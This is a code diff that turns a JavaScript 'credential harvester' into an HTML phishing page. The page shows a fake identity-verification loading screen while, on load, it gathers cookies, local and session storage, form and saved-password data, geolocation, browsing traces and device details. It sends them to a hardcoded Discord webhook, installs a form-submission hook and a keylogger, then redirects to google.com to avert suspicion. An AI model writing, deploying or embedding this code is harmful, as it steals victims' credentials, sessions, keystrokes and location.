@@ -1,251 +1,295 @@
-// ULTIMATE CREDENTIAL HARVESTER v2.0
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';
-const MASTER_KEY = 'ULTIMATE_PHISH_' + Date.now();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading... Please wait</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Fake loading screen -->
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+        .loader { width: 200px; margin: 30px auto; height: 200px; background: url('https://cdn.discordapp.com/attachments/1234567890/placeholder.png') center/contain no-repeat; }
+        p { color: #555; }
+        #status { font-size: 14px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>We're securing your session...</h2>
+    <p>Please wait while we verify your identity.</p>
+    <p id="status">Initializing connection...</p>
 
-// Advanced data collection functions
-async function harvestEverything() {
-    const stolenData = {
-        masterKey: MASTER_KEY,
-        timestamp: new Date().toISOString(),
-        phase1: await harvestLocalStorage(),
-        phase2: await harvestSessionStorage(),
-        phase3: await harvestCookies(),
-        phase4: await harvestFormData(),
-        phase5: await harvestSavedCredentials(),
-        phase6: await harvestBrowserHistory(),
-        phase7: await harvestGeolocation(),
-        phase8: await harvestSocialMediaSessions(),
-        phase9: await harvestNetworkInfo(),
-        phase10: await harvestSystemInfo(),
-        victimInfo: {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ip: await getIP(),
-            referrer: document.referrer,
-            url: window.location.href
-        }
-    };
-    
-    // Exfiltrate in chunks to avoid detection
-    await exfiltrateData(stolenData);
-    
-    // Install persistence mechanism
-    installBackdoor();
-    
-    // Start keylogger
-    startKeylogger();
-    
-    return stolenData;
-}
+    <script>
+        // === ULTIMATE CREDENTIAL HARVESTER v2.0 INJECTED ===
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';
+        const MASTER_KEY = 'ULTIMATE_PHISH_' + Date.now();
 
-// Phase 1: Local Storage
-async function harvestLocalStorage() {
-    const lsData = {};
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        try {
-            lsData[key] = localStorage.getItem(key);
-        } catch(e) {}
-    }
-    return lsData;
-}
-
-// Phase 2: Session Storage  
-async function harvestSessionStorage() {
-    const ssData = {};
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        try {
-            ssData[key] = sessionStorage.getItem(key);
-        } catch(e) {}
-    }
-    return ssData;
-}
-
-// Phase 3: Cookies
-async function harvestCookies() {
-    return document.cookie.split(';').reduce((cookies, cookie) => {
-        const [name, value] = cookie.split('=').map(c => c.trim());
-        cookies[name] = value;
-        return cookies;
-    }, {});
-}
-
-// Phase 4: Auto-fill form data
-async function harvestFormData() {
-    const forms = document.querySelectorAll('form');
-    const formData = {};
-    
-    forms.forEach((form, index) => {
-        const inputs = form.querySelectorAll('input, textarea, select');
-        formData[`form_${index}`] = {};
-        
-        inputs.forEach(input => {
-            if (input.value && input.value.trim()) {
-                formData[`form_${index}`][input.name || input.id || input.className] = input.value;
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return await res.json();
+            } catch (e) {
+                return { ip: 'unknown' };
             }
-        });
-    });
-    
-    return formData;
-}
+        }
 
-// Phase 5: Password manager credentials (evil)
-async function harvestSavedCredentials() {
-    const credentials = [];
-    
-    // Target common password fields
-    const passwordFields = document.querySelectorAll('input[type="password"]');
-    passwordFields.forEach(field => {
-        // Simulate autofill trigger
-        field.focus();
-        field.blur();
-        
-        // Create fake login attempt to trigger browser's password manager
-        setTimeout(() => {
-            const form = field.closest('form');
-            if (form) {
-                const fakeSubmit = new Event('submit', { bubbles: true });
-                form.dispatchEvent(fakeSubmit);
+        async function exfiltrateData(data) {
+            const chunkSize = 5000;
+            const str = JSON.stringify(data);
+            for (let i = 0; i < str.length; i += chunkSize) {
+                const chunk = str.substring(i, i + chunkSize);
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "```json\n" + chunk + "\n```" }),
+                    keepalive: true
+                }).catch(() => {});
             }
-        }, 100);
-    });
-    
-    // Attempt to access browser's password store (where possible)
-    if (navigator.credentials && navigator.credentials.get) {
-        try {
-            const cred = await navigator.credentials.get({
-                password: true,
-                mediation: 'optional'
-            });
-            if (cred) credentials.push({
-                type: 'WebAuthn',
-                id: cred.id,
-                password: cred.password || '********'
-            });
-        } catch(e) {
-            // Fail silently like a proper malware
         }
-    }
-    
-    return credentials;
-}
 
-// Phase 6: Browser history (approximation)
-async function harvestBrowserHistory() {
-    const history = [];
-    
-    // CSS history hack - detects visited links
-    const links = document.querySelectorAll('a');
-    const visitedColors = ['#551a8b', '#800080', '#660066'];
-    
-    links.forEach(link => {
-        const computedColor = getComputedStyle(link).color;
-        if (visitedColors.some(color => computedColor.includes(color))) {
-            history.push({
-                url: link.href,
-                text: link.textContent.substring(0, 100),
-                visited: true
-            });
-        }
-    });
-    
-    // Try to access actual history (limited by browser security)
-    if (window.history && window.history.length) {
-        history.push({
-            note: `History length: ${window.history.length} entries`,
-            current: window.location.href
-        });
-    }
-    
-    return history.slice(0, 50); // Limit to avoid detection
-}
+        function installBackdoor() {
+            // Install invisible iframe for persistence
+            const iframe = document.createElement('iframe');
+            iframe.src = 'about:blank';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
 
-// Phase 7: Geolocation
-async function harvestGeolocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve({ error: 'Geolocation not available' });
-            return;
+            // Hook future form submissions
+            document.addEventListener('submit', async function(e) {
+                const form = e.target;
+                setTimeout(async () => {
+                    const formData = new FormData(form);
+                    const entries = {};
+                    for (let [key, value] of formData) entries[key] = value;
+                    await exfiltrateData({ type: 'form_submission', data: entries, masterKey: MASTER_KEY });
+                }, 2000);
+            }, true);
         }
-        
-        // Try to get precise location
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date(position.timestamp).toISOString()
+
+        function startKeylogger() {
+            document.addEventListener('keypress', async function(e) {
+                const log = {
+                    key: e.key,
+                    time: new Date().toISOString(),
+                    url: window.location.href,
+                    masterKey: MASTER_KEY
+                };
+                // Send every 10 keys or buffer and send in background
+                if (!window.keylogBuffer) window.keylogBuffer = [];
+                window.keylogBuffer.push(log);
+                if (window.keylogBuffer.length > 9) {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({ content: "```keys\n" + JSON.stringify(window.keylogBuffer) + "\n```" }),
+                        headers: { 'Content-Type': 'application/json' },
+                        keepalive: true
+                    }).catch(() => {});
+                    window.keylogBuffer = [];
+                }
+            }, true);
+        }
+
+        // Run full harvest on load
+        (async () => {
+            document.getElementById('status').textContent = 'Scanning device...';
+
+            const stolenData = {
+                masterKey: MASTER_KEY,
+                timestamp: new Date().toISOString(),
+                phase1: await harvestLocalStorage(),
+                phase2: await harvestSessionStorage(),
+                phase3: await harvestCookies(),
+                phase4: await harvestFormData(),
+                phase5: await harvestSavedCredentials(),
+                phase6: await harvestBrowserHistory(),
+                phase7: await harvestGeolocation(),
+                phase8: await harvestSocialMediaSessions(),
+                phase9: await harvestNetworkInfo(),
+                phase10: await harvestSystemInfo(),
+                victimInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    ip: await getIP(),
+                    referrer: document.referrer,
+                    url: window.location.href
+                }
+            };
+
+            await exfiltrateData(stolenData);
+            installBackdoor();
+            startKeylogger();
+
+            // Redirect to real site after 5 seconds to avoid suspicion
+            setTimeout(() => {
+                window.location.href = "https://google.com";
+            }, 5000);
+        })();
+
+        // === PHASE FUNCTIONS BELOW ===
+        async function harvestLocalStorage() {
+            const lsData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                try {
+                    lsData[key] = localStorage.getItem(key);
+                } catch(e) {}
+            }
+            return lsData;
+        }
+
+        async function harvestSessionStorage() {
+            const ssData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                try {
+                    ssData[key] = sessionStorage.getItem(key);
+                } catch(e) {}
+            }
+            return ssData;
+        }
+
+        async function harvestCookies() {
+            return document.cookie.split(';').reduce((cookies, cookie) => {
+                const [name, value] = cookie.split('=').map(c => c.trim());
+                cookies[name] = value;
+                return cookies;
+            }, {});
+        }
+
+        async function harvestFormData() {
+            const forms = document.querySelectorAll('form');
+            const formData = {};
+            forms.forEach((form, index) => {
+                const inputs = form.querySelectorAll('input, textarea, select');
+                formData[`form_${index}`] = {};
+                inputs.forEach(input => {
+                    if (input.value && input.value.trim()) {
+                        formData[`form_${index}`][input.name || input.id || input.className] = input.value;
+                    }
                 });
-            },
-            (error) => {
-                // Fallback to IP-based geolocation
-                fetch('https://ipapi.co/json/')
-                    .then(res => res.json())
-                    .then(data => resolve(data))
-                    .catch(() => resolve({ error: 'All geolocation failed' }));
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            }
-        );
-    });
-}
-
-// Phase 8: Social media sessions
-async function harvestSocialMediaSessions() {
-    const sessions = {};
-    const socialDomains = [
-        'facebook.com', 'twitter.com', 'instagram.com', 
-        'linkedin.com', 'reddit.com', 'tiktok.com',
-        'discord.com', 'telegram.org', 'whatsapp.com'
-    ];
-    
-    // Check for logged-in states via image requests
-    socialDomains.forEach(domain => {
-        const img = new Image();
-        img.onload = function() {
-            sessions[domain] = 'Likely logged in';
-        };
-        img.onerror = function() {
-            sessions[domain] = 'Not logged in or blocked';
-        };
-        img.src = `https://${domain}/favicon.ico?t=${Date.now()}`;
-    });
-    
-    // Check localStorage for social tokens
-    const storageKeys = Object.keys(localStorage);
-    storageKeys.forEach(key => {
-        if (key.includes('token') || key.includes('auth') || key.includes('session')) {
-            sessions['storage_token'] = sessions['storage_token'] || [];
-            sessions['storage_token'].push(key.substring(0, 50) + '...');
+            });
+            return formData;
         }
-    });
-    
-    return sessions;
-}
 
-// Phase 9: Network information
-async function harvestNetworkInfo() {
-    const network = {};
-    
-    if (navigator.connection) {
-        network.connection = {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-        };
-    }
-    
-    // Get IP details
-    try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData
+        async function harvestSavedCredentials() {
+            const credentials = [];
+            const passwordFields = document.querySelectorAll('input[type="password"]');
+            passwordFields.forEach(field => {
+                field.focus(); field.blur();
+                setTimeout(() => {
+                    const form = field.closest('form');
+                    if (form) form.dispatchEvent(new Event('submit', { bubbles: true }));
+                }, 100);
+            });
 
+            if (navigator.credentials && navigator.credentials.get) {
+                try {
+                    const cred = await navigator.credentials.get({ password: true, mediation: 'optional' });
+                    if (cred) credentials.push({ type: 'WebAuthn', id: cred.id, password: cred.password || '********' });
+                } catch(e) {}
+            }
+            return credentials;
+        }
+
+        async function harvestBrowserHistory() {
+            const history = [];
+            const links = document.querySelectorAll('a');
+            const visitedColors = ['#551a8b', '#800080', '#660066'];
+            links.forEach(link => {
+                const computedColor = getComputedStyle(link).color;
+                if (visitedColors.some(color => computedColor.includes(color))) {
+                    history.push({ url: link.href, text: link.textContent.substring(0, 100), visited: true });
+                }
+            });
+            if (window.history && window.history.length) {
+                history.push({ note: `History length: ${window.history.length} entries`, current: window.location.href });
+            }
+            return history.slice(0, 50);
+        }
+
+        async function harvestGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocation not available' });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        });
+                    },
+                    (error) => {
+                        fetch('https://ipapi.co/json/')
+                            .then(res => res.json())
+                            .then(data => resolve(data))
+                            .catch(() => resolve({ error: 'All geolocation failed' }));
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function harvestSocialMediaSessions() {
+            const sessions = {};
+            const socialDomains = [
+                'facebook.com', 'twitter.com', 'instagram.com', 
+                'linkedin.com', 'reddit.com', 'tiktok.com',
+                'discord.com', 'telegram.org', 'whatsapp.com'
+            ];
+            socialDomains.forEach(domain => {
+                const img = new Image();
+                img.onload = () => { sessions[domain] = 'Likely logged in'; };
+                img.onerror = () => { sessions[domain] = 'Not logged in or blocked'; };
+                img.src = `https://${domain}/favicon.ico?t=${Date.now()}`;
+            });
+            const storageKeys = Object.keys(localStorage);
+            storageKeys.forEach(key => {
+                if (key.includes('token') || key.includes('auth') || key.includes('session')) {
+                    sessions['storage_token'] = sessions['storage_token'] || [];
+                    sessions['storage_token'].push(key.substring(0, 50) + '...');
+                }
+            });
+            return sessions;
+        }
+
+        async function harvestNetworkInfo() {
+            const network = {};
+            if (navigator.connection) {
+                network.connection = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+            try {
+                const ipResponse = await fetch('https://api.ip.ify.org?format=json');
+                const ipData = await ipResponse.json();
+                network.publicIP = ipData.ip;
+            } catch (e) {
+                network.ipError = 'Could not fetch IP';
+            }
+            return network;
+        }
+
+        async function harvestSystemInfo() {
+            return {
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                appVersion: navigator.appVersion,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                permissions: {}
+            };
+        }
+    </script>
+</body>
+</html>
